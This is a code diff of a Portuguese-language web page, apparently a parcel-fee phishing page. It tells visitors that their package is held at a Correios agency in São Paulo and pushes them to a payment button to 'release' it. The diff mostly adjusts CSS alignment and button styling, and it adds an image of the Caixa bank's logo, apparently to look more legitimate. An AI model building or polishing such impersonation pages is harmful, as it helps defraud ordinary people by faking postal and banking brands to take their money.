@@ -227,7 +227,7 @@
       border-radius: 8px;
       padding: 2rem;
       font-family: Arial, sans-serif;
-      text-align: center;
+      text-align: left;
       max-width: 700px;
       margin: 2rem auto;
       display: none;
@@ -242,6 +242,7 @@
     #resultado p, #pagamento p {
       font-size: 14px;
       margin: 0.5rem 0;
+      text-align: left;
     }
 
     #resultado p span, #pagamento p span {
@@ -255,22 +256,26 @@
       font-weight: bold;
       font-size: 18px;
       margin-bottom: 15px;
+      text-align: left;
     }
     
     .status-label {
       color: #003157;
       font-weight: bold;
       margin-bottom: 5px;
+      text-align: left;
     }
     
     .status-value {
       color: #ffc107;
       font-weight: bold;
+      text-align: left;
     }
     
     .normal-text {
       color: #000000;
       margin: 15px 0;
+      text-align: left;
     }
 
     /* Rua e Bairro vazios */
@@ -293,7 +298,7 @@
     /* Botão sim sou eu */
     #btn-sim-sou-eu, #btn-pagar {
       margin-top: 1.5rem;
-      padding: 0.4rem 1.5rem;
+      padding: 0.6rem 1.5rem;
       font-size: 1.1rem;
       background-color: #007bff;
       color: white;
@@ -304,7 +309,6 @@
       display: inline-block;
       max-width: 600px;
       width: 100%;
-      font-weight: normal;
     }
 
     #btn-sim-sou-eu:hover, #btn-pagar:hover {
@@ -357,6 +361,7 @@
       border-radius: 4px;
       margin-bottom: 20px;
       font-size: 14px;
+      text-align: left;
     }
     
     .breadcrumb a {
@@ -376,6 +381,17 @@
       content: ">";
       padding: 0 5px;
       color: #6c757d;
+    }
+
+    /* Caixa image */
+    .caixa-image {
+      margin: 20px 0;
+      text-align: center;
+    }
+
+    .caixa-image img {
+      max-width: 200px;
+      height: auto;
     }
   </style>
 </head>
@@ -466,6 +482,10 @@
       <p style="color: #007bff;">Sua encomenda está retida na agência dos Correios em São Paulo</p>
       
       <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
+      
+      <div class="caixa-image">
+        <img src="images/Caixa.png" alt="Caixa">
+      </div>
       
       <div class="btn-container">
         <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
